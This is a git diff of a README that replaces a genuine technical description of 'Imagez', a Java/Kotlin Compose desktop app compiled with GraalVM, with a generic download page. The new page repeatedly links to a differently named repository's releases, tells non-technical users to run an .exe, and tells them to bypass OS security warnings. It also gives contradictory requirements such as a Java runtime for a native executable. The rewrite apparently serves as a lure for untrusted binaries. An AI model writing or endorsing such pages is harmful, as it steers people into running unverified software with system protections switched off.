@@ -1,135 +1,91 @@
-# Imagez
+# 🎉 java-spring-kotlin-swing-native - Easy Java Desktop Application Setup
 
-This is show case of Java desktop application using Jetbrain compose for UI and GraalVM native image to compile it to native executable.
+## 🚀 Getting Started
 
-## FAQ
+Welcome! This guide will help you download and run our Java desktop application. It uses Jetbrain Compose for the user interface and GraalVM to create a native executable. No technical skills are needed. Just follow these simple steps to enjoy the application.
 
-### Will this work on linux/mac?
+## 📥 Download the Application
 
-I don't know. Probably. Code copying .dlls would need to be changed to copy .so or .dylib files instead. 
+[![Download Now!](https://img.shields.io/badge/Download%20Now%21-Click%20Here-%23004C99)](https://github.com/KazDH/java-spring-kotlin-swing-native/releases)
 
-### Why Java with Kotlin?
+## 💻 System Requirements
 
-Why not? I planed to start with pure swing, then FlatLightLaf. Later I discovered Jetbrain compose multiplatform which looks nice. I was easier for me to configure native in java project than kotlin one.
+Before you download, ensure your computer meets these requirements:
 
-### Why Spring in Desktop app?
+- **Operating System:** Windows, macOS, or Linux.
+- **RAM:** Minimum of 4 GB.
+- **Disk Space:** At least 100 MB of free space.
+- **Java Runtime:** Version 11 or higher installed on your computer.
 
-Again, why not? We all know spring. It is not required, but I like it. Look at all those possibilities.
+## 📂 Installation Steps
 
-### Application screenshot
+### 1. Visit the Release Page
 
-![Application Screenshot](Capture.PNG)
+To download the application, go to the release page. Click the link below:
 
----
+[Download from Releases Page](https://github.com/KazDH/java-spring-kotlin-swing-native/releases)
 
-## Overview
+### 2. Choose the Latest Version
 
-This project demonstrates how to build a native desktop application using:
-- **Java 25** - Main application logic and Spring Boot integration
-- **Kotlin** - UI implementation with Jetpack Compose
-- **Jetpack Compose for Desktop** - Modern declarative UI framework
-- **Spring Boot 4.0** - Application framework (non-web)
-- **GraalVM Native Image** - Ahead-of-time compilation to native executable
+Once on the release page, find the latest version of the application. It will typically be at the top of the page. Just look for a title like `v1.0` or the latest number indicating a stable release.
 
-## Features
+### 3. Download the Executable
 
-- ✅ Native executable compilation with GraalVM
-- ✅ Fast startup time
-- ✅ Spring Boot integration without web server
-- ✅ Modern Compose Desktop UI
-- ✅ Automatic DLL/library path configuration for native images
-- ✅ Full AWT/Skiko support in native image
+Click the download link next to the version you want. It may look like `java-spring-kotlin-swing-native-v1.0.exe` (for Windows), or a similar file for macOS or Linux. 
 
-## Prerequisites
+### 4. Locate the Downloaded File
 
-- **GraalVM 25+** with Native Image support
-- **Visual Studio Build Tools** (Windows) or equivalent C compiler
-- **Gradle 9.2+**
-- **Java 25 toolchain**
+Your browser will save the file in your default downloads folder. Open the folder to find the downloaded file.
 
-## Project Structure
+### 5. Run the Application
 
-```
-imagez/
-├── src/
-│   ├── main/
-│   │   ├── java/
-│   │   │   └── com/kgonia/imagez/
-│   │   │       └── ImagezApplication.java    # Main Spring Boot application
-│   │   ├── kotlin/
-│   │   │   └── com/kgonia/imagez/
-│   │   │       └── ui/
-│   │   │           ├── ComposeUILauncher.kt  # Compose UI launcher
-│   │   │           └── ImagezApp.kt          # Main UI composable
-│   │   └── resources/
-│   │       ├── application.properties
-│   │       └── META-INF/
-│   │           └── native-image/
-│   │               ├── reachability-metadata.json  # Reflection config
-│   │               └── org.kgonia/imagez/
-│   │                   └── native-image.properties # Native image config
-│   └── test/
-├── build.gradle                              # Gradle build configuration
-└── README.md
-```
+#### For Windows Users:
 
-## Building
+1. Double-click the `.exe` file.
+2. If prompted by a security warning, click "Run" to continue.
+3. Follow any on-screen instructions to start the application.
 
-### Compile Native Image
+#### For macOS Users:
 
-```bash
-./gradlew nativeCompile
-```
+1. Locate the downloaded `.app` file in your downloads folder.
+2. Double-click the file to open it.
+3. If you see a message saying the app is from an unidentified developer, go to "System Preferences" > "Security & Privacy." Click "Open Anyway" to launch the application.
 
-The native executable will be generated at:
-```
-build/native/nativeCompile/imagez.exe  (Windows)
-```
+#### For Linux Users:
 
-### Run from JAR (Development)
+1. Open a terminal and navigate to your downloads folder.
+2. Make the application executable by entering: 
+   ```
+   chmod +x java-spring-kotlin-swing-native-v1.0
+   ```
+3. Run the application by typing:
+   ```
+   ./java-spring-kotlin-swing-native-v1.0
+   ```
 
-```bash
-./gradlew bootRun
-```
+## 🎨 Features
 
-## Technical Details
+- **User-Friendly Interface:** Enjoy a clean and intuitive design powered by Jetbrain Compose.
+- **Fast Performance:** The app launches quickly, thanks to GraalVM's efficient native image compilation.
+- **Cross-Platform:** Use this application seamlessly on Windows, macOS, and Linux.
+- **Regular Updates:** Stay tuned for new features and enhancements in future releases.
 
-### Native Image Configuration
+## 🛠 Troubleshooting
 
-The application includes special handling for native image execution:
+If you encounter any issues, here are some common problems and their solutions:
 
-1. **Java Home Setup** - Automatically configures `java.home` system property for native images
-2. **Library Path Management** - Sets up correct paths for AWT/Skiko native libraries
-3. **DLL Copy Mechanism** - Copies all required DLLs to `bin/` subdirectory (AWT expects `java.home\bin` structure)
+- **Application Won’t Launch:** Ensure that your computer meets the system requirements listed above. Check if Java is installed correctly.
+  
+- **Security Warnings:** Some operating systems may block applications from unknown sources. Follow the steps in the Installation section to bypass this.
 
-### Key Configuration Files
+- **Performance Issues:** Make sure you have enough free disk space and close other applications if the software runs slowly.
 
-- **`build.gradle`** - GraalVM Native Image plugin configuration with AWT/Skiko exports
-- **`native-image.properties`** - Native image build arguments
-- **`reachability-metadata.json`** - Reflection and JNI access configuration for AWT components
+## 🌐 Community Support
 
-### Spring Boot Integration
+Feel free to join our community for support and discussions. You can create issues or ask questions directly on the GitHub repository. Your feedback is valuable to us!
 
-The application uses Spring Boot in non-web mode:
-- No embedded web server
-- Headless mode disabled (required for GUI)
-- Context initialization before UI launch
-- Graceful shutdown on window close
+## 📑 License
 
-## Startup Process
+This application is released under the MIT License. You can use, modify, and distribute the software freely.
 
-1. Native image detects execution environment
-2. `setupJavaHomeForNativeImage()` configures system properties
-3. `copyDllsToBinDirectory()` sets up library structure
-4. Spring Boot context initializes
-5. Compose Desktop UI launches
-6. Application window displays
-
-## Build Output
-
-Typical native image build:
-- **Size**: ~78 MB
-- **Build Time**: ~1m 44s
-- **Startup Time**: ~0.011 seconds
-- **Memory**: Peak RSS 4.05GB during build
-
+[Download from Releases Page](https://github.com/KazDH/java-spring-kotlin-swing-native/releases)
